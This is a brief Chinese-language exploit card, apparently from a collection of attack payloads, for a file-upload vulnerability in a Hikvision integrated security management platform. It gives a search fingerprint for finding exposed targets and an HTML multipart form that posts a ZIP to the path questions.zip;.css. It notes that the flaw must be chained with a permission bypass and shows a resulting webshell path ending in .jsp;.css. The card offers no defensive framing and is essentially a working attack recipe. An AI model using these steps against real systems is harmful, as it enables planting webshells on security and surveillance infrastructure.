# 海康威视综合安防questions.zip;.css文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`header ="portal/cas/loginPage"`

**请求体 / payload**
```
Upload.html（该漏洞需要配合权限绕过⻝⽤）
<html>
<head>
</head>
<body>
<form method="POST" action="http://127.0.0.1:8080/center/api/questions.zip;.css"
enctype="multipart/form-data">
<input type="file" name="file"></input>
<input type="submit" ></input>
</form>
</body>
</html>
Zip压缩包
访问[http://127.0.0.1/center/api/questions.zip;.css](http://127.0.0.1/center/api/questions.zip;.css)出现以下内容就可以打。
出现以下代表打成功了。
Webshell路径：[http://172.16.135.34:8001/clusterMgr/tsagsl.jsp;.css](http://172.16.135.34:8001/clusterMgr/tsagsl.jsp;.css)
```
- **预期**：200　|　—